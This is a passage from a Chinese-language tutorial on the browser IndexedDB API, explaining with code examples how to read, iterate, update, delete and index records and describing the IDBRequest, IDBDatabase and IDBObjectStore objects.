&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;未获得数据记录&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">read();</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>objectStore.get()</code>方法用于读取数据，参数是主键的值。</p>
<h5 id="14-3-5-遍历数据"><a href="#14-3-5-遍历数据" class="headerlink" title="14.3.5 遍历数据"></a>14.3.5 遍历数据</h5><p>遍历数据表格的所有记录，要使用指针对象 IDBCursor。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readAll</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> objectStore = db.transaction(<span class="string">&#x27;person&#x27;</span>).objectStore(<span class="string">&#x27;person&#x27;</span>);</span><br><span class="line"></span><br><span class="line">   objectStore.openCursor().onsuccess = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">     <span class="keyword">var</span> cursor = event.target.result;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (cursor) &#123;</span><br><span class="line">       <span class="built_in">console</span>.log(<span class="string">&#x27;Id: &#x27;</span> + cursor.key);</span><br><span class="line">       <span class="built_in">console</span>.log(<span class="string">&#x27;Name: &#x27;</span> + cursor.value.name);</span><br><span class="line">       <span class="built_in">console</span>.log(<span class="string">&#x27;Age: &#x27;</span> + cursor.value.age);</span><br><span class="line">       <span class="built_in">console</span>.log(<span class="string">&#x27;Email: &#x27;</span> + cursor.value.email);</span><br><span class="line">       cursor.continue();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">&#x27;没有更多数据了！&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">readAll();</span><br></pre></td></tr></table></figure>
<p>上面代码中，新建指针对象的<code>openCursor()</code>方法是一个异步操作，所以要监听<code>success</code>事件。</p>
<h5 id="14-3-6-更新数据"><a href="#14-3-6-更新数据" class="headerlink" title="14.3.6 更新数据"></a>14.3.6 更新数据</h5><p>更新数据要使用<code>IDBObject.put()</code>方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> request = db.transaction([<span class="string">&#x27;person&#x27;</span>], <span class="string">&#x27;readwrite&#x27;</span>)</span><br><span class="line">    .objectStore(<span class="string">&#x27;person&#x27;</span>)</span><br><span class="line">    .put(&#123; <span class="attr">id</span>: <span class="number">1</span>, <span class="attr">name</span>: <span class="string">&#x27;李四&#x27;</span>, <span class="attr">age</span>: <span class="number">35</span>, <span class="attr">email</span>: <span class="string">&#x27;lisi@example.com&#x27;</span> &#125;);</span><br><span class="line"></span><br><span class="line">  request.onsuccess = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;数据更新成功&#x27;</span>);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  request.onerror = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;数据更新失败&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">update();</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>put()</code>方法自动更新了主键为<code>1</code>的记录。</p>
<h5 id="14-3-7-删除数据"><a href="#14-3-7-删除数据" class="headerlink" title="14.3.7 删除数据"></a>14.3.7 删除数据</h5><p><code>IDBObjectStore.delete()</code>方法用于删除记录。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">remove</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> request = db.transaction([<span class="string">&#x27;person&#x27;</span>], <span class="string">&#x27;readwrite&#x27;</span>)</span><br><span class="line">    .objectStore(<span class="string">&#x27;person&#x27;</span>)</span><br><span class="line">    .delete(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  request.onsuccess = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;数据删除成功&#x27;</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">remove();</span><br></pre></td></tr></table></figure>
<h5 id="14-3-8-使用索引"><a href="#14-3-8-使用索引" class="headerlink" title="14.3.8 使用索引"></a>14.3.8 使用索引</h5><p>索引的意义在于，可以让你搜索任意字段，也就是说从任意字段拿到数据记录。如果不建立索引，默认只能搜索主键（即从主键取值）。</p>
<p>假定新建表格的时候，对<code>name</code>字段建立了索引。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">objectStore.createIndex(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;name&#x27;</span>, &#123; <span class="attr">unique</span>: <span class="literal">false</span> &#125;);</span><br></pre></td></tr></table></figure>
<p>现在，就可以从<code>name</code>找到对应的数据记录了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> transaction = db.transaction([<span class="string">&#x27;person&#x27;</span>], <span class="string">&#x27;readonly&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> store = transaction.objectStore(<span class="string">&#x27;person&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> index = store.index(<span class="string">&#x27;name&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> request = index.get(<span class="string">&#x27;李四&#x27;</span>);</span><br><span class="line"></span><br><span class="line">request.onsuccess = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> result = e.target.result;</span><br><span class="line">  <span class="keyword">if</span> (result) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="14-4-indexedDB-对象"><a href="#14-4-indexedDB-对象" class="headerlink" title="14.4 indexedDB 对象"></a>14.4 indexedDB 对象</h4><p>浏览器原生提供<code>indexedDB</code>对象，作为开发者的操作接口。</p>
<h5 id="14-4-1-indexedDB-open"><a href="#14-4-1-indexedDB-open" class="headerlink" title="14.4.1 indexedDB.open()"></a>14.4.1 indexedDB.open()</h5><p><code>indexedDB.open()</code>方法用于打开数据库。这是一个异步操作，但是会立刻返回一个 IDBOpenDBRequest 对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> openRequest = <span class="built_in">window</span>.indexedDB.open(<span class="string">&#x27;test&#x27;</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码表示，打开一个名为<code>test</code>、版本为<code>1</code>的数据库。如果该数据库不存在，则会新建该数据库。</p>
<p><code>open()</code>方法的第一个参数是数据库名称，格式为字符串，不可省略；第二个参数是数据库版本，是一个大于<code>0</code>的正整数（<code>0</code>将报错），如果该参数大于当前版本，会触发数据库升级。第二个参数可省略，如果数据库已存在，将打开当前版本的数据库；如果数据库不存在，将创建该版本的数据库，默认版本为<code>1</code>。</p>
<p>打开数据库是异步操作，通过各种事件通知客户端。下面是有可能触发的4种事件。</p>
<ul>
<li><code>success</code>：打开成功。</li>
<li><code>error</code>：打开失败。</li>
<li><code>upgradeneeded</code>：第一次打开该数据库，或者数据库版本发生变化。</li>
<li><code>blocked</code>：上一次的数据库连接还未关闭。</li>
</ul>
<p>第一次打开数据库时，会先触发<code>upgradeneeded</code>事件，然后触发<code>success</code>事件。</p>
<p>根据不同的需要，对上面4种事件监听函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> openRequest = indexedDB.open(<span class="string">&#x27;test&#x27;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">var</span> db;</span><br><span class="line"></span><br><span class="line">openRequest.onupgradeneeded = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;Upgrading...&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">openRequest.onsuccess = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">  db = openRequest.result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">openRequest.onerror = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;Error&#x27;</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码有两个地方需要注意。首先，<code>open()</code>方法返回的是一个对象（IDBOpenDBRequest），监听函数就定义在这个对象上面。其次，<code>success</code>事件发生后，从<code>openRequest.result</code>属性可以拿到已经打开的<code>IndexedDB</code>数据库对象。</p>
<h5 id="14-4-2-indexedDB-deleteDatabase"><a href="#14-4-2-indexedDB-deleteDatabase" class="headerlink" title="14.4.2 indexedDB.deleteDatabase()"></a>14.4.2 indexedDB.deleteDatabase()</h5><p><code>indexedDB.deleteDatabase()</code>方法用于删除一个数据库，参数为数据库的名字。它会立刻返回一个<code>IDBOpenDBRequest</code>对象，然后对数据库执行异步删除。删除操作的结果会通过事件通知，<code>IDBOpenDBRequest</code>对象可以监听以下事件。</p>
<ul>
<li><code>success</code>：删除成功</li>
<li><code>error</code>：删除报错</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> DBDeleteRequest = <span class="built_in">window</span>.indexedDB.deleteDatabase(<span class="string">&#x27;demo&#x27;</span>);</span><br><span class="line"></span><br><span class="line">DBDeleteRequest.onerror = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;Error&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">DBDeleteRequest.onsuccess = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;success&#x27;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>调用<code>deleteDatabase()</code>方法以后，当前数据库的其他已经打开的连接都会接收到<code>versionchange</code>事件。</p>
<p>注意，删除不存在的数据库并不会报错。</p>
<h4 id="14-4-3-indexedDB-cmp"><a href="#14-4-3-indexedDB-cmp" class="headerlink" title="14.4.3 indexedDB.cmp()"></a>14.4.3 indexedDB.cmp()</h4><p><code>indexedDB.cmp()</code>方法比较两个值是否为 indexedDB 的相同的主键。它返回一个整数，表示比较的结果：<code>0</code>表示相同，<code>1</code>表示第一个主键大于第二个主键，<code>-1</code>表示第一个主键小于第二个主键。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.indexedDB.cmp(<span class="number">1</span>, <span class="number">2</span>) <span class="comment">// -1</span></span><br></pre></td></tr></table></figure>
<p>注意，这个方法不能用来比较任意的 JavaScript 值。如果参数是布尔值或对象，它会报错。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.indexedDB.cmp(<span class="number">1</span>, <span class="literal">true</span>) <span class="comment">// 报错</span></span><br><span class="line"><span class="built_in">window</span>.indexedDB.cmp(&#123;&#125;, &#123;&#125;) <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure>
<h4 id="14-5-IDBRequest-对象"><a href="#14-5-IDBRequest-对象" class="headerlink" title="14.5 IDBRequest 对象"></a>14.5 IDBRequest 对象</h4><p>IDBRequest 对象表示打开的数据库连接，indexedDB.open()方法和indexedDB.deleteDatabase()方法会返回这个对象。数据库的操作都是通过这个对象完成的。</p>
<p>这个对象的所有操作都是异步操作，要通过readyState属性判断是否完成，如果为pending就表示操作正在进行，如果为done就表示操作完成，可能成功也可能失败。</p>
<p>操作完成以后，触发success事件或error事件，这时可以通过result属性和error属性拿到操作结果。如果在pending阶段，就去读取这两个属性，是会报错的。</p>
<p>IDBRequest 对象有以下属性。</p>
<ul>
<li><code>IDBRequest.readyState</code>:等于<code>pending</code>表示操作正在进行，等于<code>done</code>表示操作正在完成。</li>
<li><code>IDBRequest.result</code>:返回请求的结果。如果请求失败、结果不可用，读取该属性会报错。</li>
<li><code>IDBRequest.error</code>:请求失败时，返回错误对象。</li>
<li><code>IDBRequest.source</code>:返回请求的来源（比如索引对象或 ObjectStore）。</li>
<li><code>IDBRequest.transaction</code>:返回当前请求正在进行的事务，如果不包含事务，返回`null。</li>
<li><code>IDBRequest.onsuccess</code>:指定<code>success</code>事件的监听函数。</li>
<li><code>IDBRequest.onerror</code>:指定<code>error</code>事件的监听函数。</li>
</ul>
<p>IDBOpenDBRequest 对象继承了IDBRequest 对象，提供了两个额外的事件监听属性。</p>
<ul>
<li><code>IDBOpenDBRequest.onblocked</code>:指定<code>blocked</code>事件（<code>upgradeneeded</code>事件触发时，数据库仍然在使用）的监听函数。</li>
<li><code>IDBOpenDBRequest.onupgradeneeded</code>:<code>upgradeneeded</code>事件的监听函数。</li>
</ul>
<h4 id="14-6-IDBDatabase-对象"><a href="#14-6-IDBDatabase-对象" class="headerlink" title="14.6 IDBDatabase 对象"></a>14.6 IDBDatabase 对象</h4><p>打开数据成功以后，可以从<code>IDBOpenDBRequest</code>对象的<code>result</code>属性上面，拿到一个<code>IDBDatabase</code>对象，它表示连接的数据库。后面对数据库的操作，都通过这个对象完成。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> db;</span><br><span class="line"><span class="keyword">var</span> DBOpenRequest = <span class="built_in">window</span>.indexedDB.open(<span class="string">&#x27;demo&#x27;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">DBOpenRequest.onerror = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;Error&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">DBOpenRequest.onsuccess = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  db = DBOpenRequest.result;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h5 id="14-6-1-属性"><a href="#14-6-1-属性" class="headerlink" title="14.6.1 属性"></a>14.6.1 属性</h5><p>IDBDatabase 对象有以下属性。</p>
<ul>
<li><code>IDBDatabase.name</code>:字符串，数据库名称。</li>
<li><code>IDBDatabase.version</code>:整数，数据库版本。数据库第一次创建时，该属性为空字符串。</li>
<li><code>IDBDatabase.objectStoreNames</code>:DOMStringList 对象（字符串的集合），包含当前数据的所有 object store 的名字。</li>
<li><code>IDBDatabase.onabort</code>:指定 abort 事件（事务中止）的监听函数。</li>
<li><code>IDBDatabase.onclose</code>:指定 close 事件（数据库意外关闭）的监听函数。</li>
<li><code>IDBDatabase.onerror</code>:指定 error 事件（访问数据库失败）的监听函数。</li>
<li><code>IDBDatabase.onversionchange</code>:数据库版本变化时触发（发生<code>upgradeneeded</code>事件，或调用<code>indexedDB.deleteDatabase()</code>）。</li>
</ul>
<p>下面是<code>objectStoreNames</code>属性的例子。该属性返回一个 DOMStringList 对象，包含了当前数据库所有对象仓库的名称（即表名），可以使用 DOMStringList 对象的<code>contains</code>方法，检查数据库是否包含某个对象仓库。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!db.objectStoreNames.contains(<span class="string">&#x27;firstOS&#x27;</span>)) &#123;</span><br><span class="line">  db.createObjectStore(<span class="string">&#x27;firstOS&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码先判断某个对象仓库是否存在，如果不存在就创建该对象仓库。</p>
<h5 id="14-6-2-方法"><a href="#14-6-2-方法" class="headerlink" title="14.6.2 方法"></a>14.6.2 方法</h5><p>IDBDatabase 对象有以下方法。</p>
<ul>
<li><code>IDBDatabase.close()</code>：关闭数据库连接，实际会等所有事务完成后再关闭。</li>
<li><code>IDBDatabase.createObjectStore()</code>：创建存放数据的对象仓库，类似于传统关系型数据库的表格，返回一个 IDBObjectStore 对象。该方法只能在<code>versionchange</code>事件监听函数中调用。</li>
<li><code>IDBDatabase.deleteObjectStore()</code>：删除指定的对象仓库。该方法只能在<code>versionchange</code>事件监听函数中调用。</li>
<li><code>IDBDatabase.transaction()</code>：返回一个 IDBTransaction 事务对象。</li>
</ul>
<p>下面是<code>createObjectStore()</code>方法的例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> request = <span class="built_in">window</span>.indexedDB.open(<span class="string">&#x27;demo&#x27;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">request.onupgradeneeded = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> db = event.target.result;</span><br><span class="line"></span><br><span class="line">  db.onerror = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> objectStore = db.createObjectStore(<span class="string">&#x27;items&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>上面代码创建了一个名为<code>items</code>的对象仓库，如果该对象仓库已经存在，就会抛出一个错误。为了避免出错，需要用到下文的<code>objectStoreNames</code>属性，检查已有哪些对象仓库。</p>
<p><code>createObjectStore()</code>方法还可以接受第二个对象参数，用来设置对象仓库的属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">db.createObjectStore(<span class="string">&#x27;test&#x27;</span>, &#123; <span class="attr">keyPath</span>: <span class="string">&#x27;email&#x27;</span> &#125;);</span><br><span class="line">db.createObjectStore(<span class="string">&#x27;test2&#x27;</span>, &#123; <span class="attr">autoIncrement</span>: <span class="literal">true</span> &#125;);</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>keyPath</code>属性表示主键（由于主键的值不能重复，所以上例存入之前，必须保证数据的<code>email</code>属性值都是不一样的），默认值为<code>null；autoIncrement</code>属性表示，是否使用自动递增的整数作为主键（第一个数据记录为<code>1</code>，第二个数据记录为<code>2</code>，以此类推），默认为<code>false</code>。一般来说，<code>keyPath</code>和<code>autoIncrement</code>属性只要使用一个就够了，如果两个同时使用，表示主键为递增的整数，且对象不得缺少<code>keyPath</code>指定的属性。</p>
<p>下面是<code>deleteObjectStore()</code>方法的例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> dbName = <span class="string">&#x27;sampleDB&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> dbVersion = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">var</span> request = indexedDB.open(dbName, dbVersion);</span><br><span class="line"></span><br><span class="line">request.onupgradeneeded = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> db = request.result;</span><br><span class="line">  <span class="keyword">if</span> (e.oldVersion &lt; <span class="number">1</span>) &#123;</span><br><span class="line">    db.createObjectStore(<span class="string">&#x27;store1&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (e.oldVersion &lt; <span class="number">2</span>) &#123;</span><br><span class="line">    db.deleteObjectStore(<span class="string">&#x27;store1&#x27;</span>);</span><br><span class="line">    db.createObjectStore(<span class="string">&#x27;store2&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>下面是<code>transaction()</code>方法的例子，该方法用于创建一个数据库事务，返回一个 IDBTransaction 对象。向数据库添加数据之前，必须先创建数据库事务。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> t = db.transaction([<span class="string">&#x27;items&#x27;</span>], <span class="string">&#x27;readwrite&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p><code>transaction()</code>方法接受两个参数：第一个参数是一个数组，里面是所涉及的对象仓库，通常是只有一个；第二个参数是一个表示操作类型的字符串。目前，操作类型只有两种：<code>readonly</code>（只读）和<code>readwrite</code>（读写）。添加数据使用<code>readwrite</code>，读取数据使用<code>readonly</code>。第二个参数是可选的，省略时默认为<code>readonly</code>模式。</p>
<h4 id="14-7-IDBObjectStore-对象"><a href="#14-7-IDBObjectStore-对象" class="headerlink" title="14.7 IDBObjectStore 对象"></a>14.7 IDBObjectStore 对象</h4><p>IDBObjectStore 对象对应一个对象仓库（object store）。<code>IDBDatabase.createObjectStore()</code>方法返回的就是一个 IDBObjectStore 对象。</p>
<p>IDBDatabase 对象的<code>transaction()</code>返回一个事务对象，该对象的<code>objectStore()</code>方法返回 IDBObjectStore 对象，因此可以采用下面的链式写法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">db.transaction([<span class="string">&#x27;test&#x27;</span>], <span class="string">&#x27;readonly&#x27;</span>)</span><br><span class="line">  .objectStore(<span class="string">&#x27;test&#x27;</span>)</span><br><span class="line">  .get(X)</span><br><span class="line">  .onsuccess = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;&#125;</span><br></pre></td></tr></table></figure>
<h5 id="14-7-1-属性"><a href="#14-7-1-属性" class="headerlink" title="14.7.1 属性"></a>14.7.1 属性</h5><p>IDBObjectStore 对象有以下属性。</p>
<ul>
<li><code>IDBObjectStore.indexNames</code>：返回一个类似数组的对象（DOMStringList），包含了当前对象仓库的所有索引。</li>
<li><code>IDBObjectStore.keyPath</code>：返回当前对象仓库的主键。</li>
<li><code>IDBObjectStore.name</code>：返回当前对象仓库的名称。</li>
<li><code>IDBObjectStore.transaction</code>：返回当前对象仓库所属的事务对象。</li>
<li><code>IDBObjectStore.autoIncrement</code>：布尔值，表示主键是否会自动递增。</li>
</ul>
<h5 id="14-7-2-方法"><a href="#14-7-2-方法" class="headerlink" title="14.7.2 方法"></a>14.7.2 方法</h5><p>IDBObjectStore 对象有以下方法。.</p>
<h6 id="（1）IDBObjectStore-add"><a href="#（1）IDBObjectStore-add" class="headerlink" title="（1）IDBObjectStore.add()"></a>（1）IDBObjectStore.add()</h6><p><code>IDBObjectStore.add()</code>用于向对象仓库添加数据，返回一个 IDBRequest 对象。该方法只用于添加数据，如果主键相同会报错，因此更新数据必须使用<code>put()</code>方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">objectStore.add(value, key)</span><br></pre></td></tr></table></figure>
<p>该方法接受两个参数，第一个参数是键值，第二个参数是主键，该参数可选，如果省略默认为<code>null</code>。</p>
<p>创建事务以后，就可以获取对象仓库，然后使用<code>add()</code>方法往里面添加数据了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> db;</span><br><span class="line"><span class="keyword">var</span> DBOpenRequest = <span class="built_in">window</span>.indexedDB.open(<span class="string">&#x27;demo&#x27;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">DBOpenRequest.onsuccess = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  db = DBOpenRequest.result;</span><br><span class="line">  <span class="keyword">var</span> transaction = db.transaction([<span class="string">&#x27;items&#x27;</span>], <span class="string">&#x27;readwrite&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  transaction.oncomplete = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;transaction success&#x27;</span>);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  transaction.onerror = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;transaction error: &#x27;</span> + transaction.error);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> objectStore = transaction.objectStore(<span class="string">&#x27;items&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> objectStoreRequest = objectStore.add(&#123; <span class="attr">foo</span>: <span class="number">1</span> &#125;);</span><br><span class="line"></span><br><span class="line">  objectStoreRequest.onsuccess = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;add data success&#x27;</span>);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h6 id="2）IDBObjectStore-put"><a href="#2）IDBObjectStore-put" class="headerlink" title="2）IDBObjectStore.put()"></a>2）IDBObjectStore.put()</h6><p><code>IDBObjectStore.put()</code>方法用于更新某个主键对应的数据记录，如果对应的键值不存在，则插入一条新的记录。该方法返回一个 IDBRequest 对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">objectStore.put(item, key)</span><br></pre></td></tr></table></figure>
<p>该方法接受两个参数，第一个参数为新数据，第二个参数为主键，该参数可选，且只在自动递增时才有必要提供，因为那时主键不包含在数据值里面。</p>
<h6 id="（3）IDBObjectStore-clear"><a href="#（3）IDBObjectStore-clear" class="headerlink" title="（3）IDBObjectStore.clear()"></a>（3）IDBObjectStore.clear()</h6><p><code>IDBObjectStore.clear()</code>删除当前对象仓库的所有记录。该方法返回一个 IDBRequest 对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">objectStore.clear()</span><br></pre></td></tr></table></figure>
<p>该方法不需要参数。<br>######（4）IDBObjectStore.delete()</p>
<p><code>IDBObjectStore.delete()</code>方法用于删除指定主键的记录。该方法返回一个 IDBRequest 对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">objectStore.delete(Key)</span><br></pre></td></tr></table></figure>
<p>该方法的参数为主键的值。</p>
<h6 id="（5）IDBObjectStore-count"><a href="#（5）IDBObjectStore-count" class="headerlink" title="（5）IDBObjectStore.count()"></a>（5）IDBObjectStore.count()</h6><p><code>IDBObjectStore.count()</code>方法用于计算记录的数量。该方法返回一个 IDBRequest 对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">IDBObjectStore.count(key)</span><br></pre></td></tr></table></figure>
<p>不带参数时，该方法返回当前对象仓库的所有记录数量。如果主键或 IDBKeyRange 对象作为参数，则返回对应的记录数量。</p>
<h6 id="（6）IDBObjectStore-getKey"><a href="#（6）IDBObjectStore-getKey" class="headerlink" title="（6）IDBObjectStore.getKey()"></a>（6）IDBObjectStore.getKey()</h6><p><code>IDBObjectStore.getKey()</code>用于获取主键。该方法返回一个 IDBRequest 对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">objectStore.getKey(key)</span><br></pre></td></tr></table></figure>
<p>该方法的参数可以是主键值或 IDBKeyRange 对象。</p>
<h6 id="（7）IDBObjectStore-get"><a href="#（7）IDBObjectStore-get" class="headerlink" title="（7）IDBObjectStore.get()"></a>（7）IDBObjectStore.get()</h6><p><code>IDBObjectStore.get()</code>用于获取主键对应的数据记录。该方法返回一个 IDBRequest 对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">objectStore.get(key)</span><br></pre></td></tr></table></figure>
<h6 id="（8）IDBObjectStore-getAll"><a href="#（8）IDBObjectStore-getAll" class="headerlink" title="（8）IDBObjectStore.getAll()"></a>（8）IDBObjectStore.getAll()</h6><p><code>DBObjectStore.getAll()</code>用于获取对象仓库的记录。该方法返回一个 IDBRequest 对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取所有记录</span></span><br><span class="line">objectStore.getAll()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取所有符合指定主键或 IDBKeyRange 的记录</span></span><br><span class="line">objectStore.getAll(query)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定获取记录的数量</span></span><br><span class="line">objectStore.getAll(query, count)</span><br></pre></td></tr></table></figure>
<h6 id="（9）IDBObjectStore-getAllKeys"><a href="#（9）IDBObjectStore-getAllKeys" class="headerlink" title="（9）IDBObjectStore.getAllKeys()"></a>（9）IDBObjectStore.getAllKeys()</h6><p><code>IDBObjectStore.getAllKeys()</code>用于获取所有符合条件的主键。该方法返回一个 IDBRequest 对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取所有记录的主键</span></span><br><span class="line">objectStore.getAllKeys()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取所有符合条件的主键</span></span><br><span class="line">objectStore.getAllKeys(query)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定获取主键的数量</span></span><br><span class="line">objectStore.getAllKeys(query, count)</span><br></pre></td></tr></table></figure>
